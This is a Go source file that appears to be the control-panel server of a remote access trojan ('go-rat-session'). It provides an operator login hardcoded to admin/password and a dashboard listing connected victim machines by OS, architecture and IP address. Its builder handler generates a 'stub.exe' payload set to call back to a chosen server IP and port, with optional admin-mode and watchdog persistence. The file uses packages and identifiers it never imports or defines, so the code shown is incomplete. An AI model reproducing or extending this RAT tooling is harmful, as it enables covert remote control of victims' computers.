package server

import (
	"fmt"
	"html/template"
	"log"
	"net/http"
	"path/filepath"
)

var templates *template.Template

// LoadTemplates parses all HTML templates from the specified directory.
// It should be called once during server initialization.
func LoadTemplates(templateDir string) error {
	absPath, err := filepath.Abs(templateDir)
	if err != nil {
		return fmt.Errorf("error getting absolute path for templates: %w", err)
	}
	log.Printf("Loading templates from: %s/*.html", absPath)
	templates, err = template.ParseGlob(filepath.Join(absPath, "*.html"))
	if err != nil {
		return fmt.Errorf("error parsing templates: %w", err)
	}
	// Log parsed template names for verification
	if templates != nil {
		for _, t := range templates.Templates() {
			log.Printf("Parsed template: %s", t.Name())
		}
	} else {
		log.Println("Templates object is nil after ParseGlob")
	}
	return nil
}

// LoginPageData holds data to be passed to the login template
type LoginPageData struct {
	Error string
}

// BuilderPageData holds data for the builder template
type BuilderPageData struct {
	Message string
}

// LoginHandler handles login requests
func LoginHandler(w http.ResponseWriter, r *http.Request) {
	session, _ := store.Get(r, "go-rat-session")

	if r.Method == http.MethodGet {
		if auth, ok := session.Values["authenticated"].(bool); ok && auth {
			http.Redirect(w, r, "/dashboard", http.StatusFound)
			return
		}
		err := templates.ExecuteTemplate(w, "login.html", nil)
		if err != nil {
			log.Printf("Error executing login template: %v", err)
			http.Error(w, "Internal Server Error: Could not render login page.", http.StatusInternalServerError)
			return
		}
	} else if r.Method == http.MethodPost {
		r.ParseForm()
		username := r.FormValue("username")
		password := r.FormValue("password")

		if username == "admin" && password == "password" {
			session.Values["authenticated"] = true
			session.Save(r, w)
			http.Redirect(w, r, "/dashboard", http.StatusFound)
		} else {
			err := templates.ExecuteTemplate(w, "login.html", LoginPageData{Error: "Invalid credentials"})
			if err != nil {
				log.Printf("Error executing login template with error: %v", err)
				http.Error(w, "Internal Server Error: Could not render login page.", http.StatusInternalServerError)
				return
			}
		}
	} else {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// LogoutHandler handles logout requests
func LogoutHandler(w http.ResponseWriter, r *http.Request) {
	session, _ := store.Get(r, "go-rat-session")
	session.Values["authenticated"] = false
	session.Save(r, w)
	http.Redirect(w, r, "/login", http.StatusFound)
}

// DashboardHandler handles dashboard requests
func DashboardHandler(w http.ResponseWriter, r *http.Request) {
	clientsList := GetAllClients() // This function is from client_manager.go
	
	// Create a data structure to pass to the template.
	// We might want to pass a subset of ClientInfo or a transformed version for security/display reasons.
	// For now, we'll pass the relevant fields directly.
	
	// To avoid passing the *websocket.Conn to the template, we can create a new struct or map.
	type DisplayClient struct {
		ID          string
		StubID      string
		OS          string
		Arch        string
		IPAddress   string
		ConnectTime time.Time
	}
	displayClients := make([]DisplayClient, 0, len(clientsList))
	for _, c := range clientsList {
		displayClients = append(displayClients, DisplayClient{
			ID:          c.ID, // Server-generated connection ID
			StubID:      c.StubID,
			OS:          c.OS,
			Arch:        c.Arch,
			IPAddress:   c.IPAddress,
			ConnectTime: c.ConnectTime,
		})
	}

	data := struct {
		Clients []DisplayClient
	}{
		Clients: displayClients,
	}

	err := templates.ExecuteTemplate(w, "dashboard.html", data)
	if err != nil {
		log.Printf("Error executing dashboard template: %v", err)
		http.Error(w, "Internal Server Error: Could not render dashboard.", http.StatusInternalServerError)
	}
}

// BuilderHandler handles builder requests
func BuilderHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		err := templates.ExecuteTemplate(w, "builder.html", nil)
		if err != nil {
			log.Printf("Error executing builder template (GET): %v", err)
			http.Error(w, "Internal Server Error: Could not render builder page.", http.StatusInternalServerError)
		}
	} else if r.Method == http.MethodPost {
		r.ParseForm()
		serverIP := r.FormValue("server_ip")
		serverPort := r.FormValue("server_port")
		adminMode := r.FormValue("admin_mode") == "true" // Checkbox value is "true" or empty
		enableWatchdog := r.FormValue("enable_watchdog") == "true"

		log.Printf("Builder form submitted: IP=%s, Port=%s, Admin=%t, Watchdog=%t", serverIP, serverPort, adminMode, enableWatchdog)

		// Call the builder service
		executableBytes, err := builder.BuildStub(serverIP, serverPort, adminMode, enableWatchdog)
		if err != nil {
			log.Printf("Error building stub: %v", err)
			data := BuilderPageData{
				Message: fmt.Sprintf("Error building stub: %v", err),
			}
			if tmplErr := templates.ExecuteTemplate(w, "builder.html", data); tmplErr != nil {
				log.Printf("Error executing builder template (POST error): %v", tmplErr)
				http.Error(w, "Internal Server Error: Could not render builder page after POST error.", http.StatusInternalServerError)
			}
			return
		}

		log.Printf("Stub built successfully. Size: %d bytes", len(executableBytes))

		// Set headers for file download
		w.Header().Set("Content-Disposition", "attachment; filename=stub.exe")
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Length", strconv.Itoa(len(executableBytes)))
		_, writeErr := w.Write(executableBytes)
		if writeErr != nil {
			log.Printf("Error writing executable bytes to response: %v", writeErr)
			// Client might have disconnected, not much we can do here other than log
		}

	} else {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}
